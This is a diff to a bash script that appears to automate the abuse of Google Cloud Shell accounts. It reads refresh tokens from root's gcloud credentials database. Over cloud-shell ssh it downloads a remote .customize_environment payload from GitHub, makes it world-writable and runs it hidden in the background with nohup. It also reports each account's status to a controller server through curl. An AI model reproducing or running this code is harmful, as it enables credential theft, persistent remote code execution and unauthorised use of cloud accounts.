@@ -45,7 +45,7 @@ do
         done 
         
         source log.sh $session "$script > nova conta $new"
-        
+
         while [ -z $refresh_token ]
         do
           sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
@@ -62,15 +62,31 @@ do
         commandOK='false'
 
         command="sudo rm -rf .customize_environment ; wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null &"
-
+        
+        t=0
+  
         while [ $commandOK != 'true' ]
         do
-          source log.sh $session "$script > while command..."
+          ((t++))
+          source log.sh $session "$script > while command ($t)"
           sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet && commandOK='true' && source log.sh $session "$script > command ok!"
+        
+          if [ $t == 5 ] 
+          then
+             source log.sh $session "$script > break while command!"
+             break 
+          fi   
+          
         done
 
-        url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
-        curl $url && source log.sh $session "$script > post send_status.php"
+        if [ $commandOK == 'true' ]
+        then
+           url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
+           curl $url && source log.sh $session "$script > post send_status.php"
+        fi
+        
+        url=$ip'/close.php?session='$session
+        curl $url && source log.sh $session "$script > post close.php"        
 
      fi
      
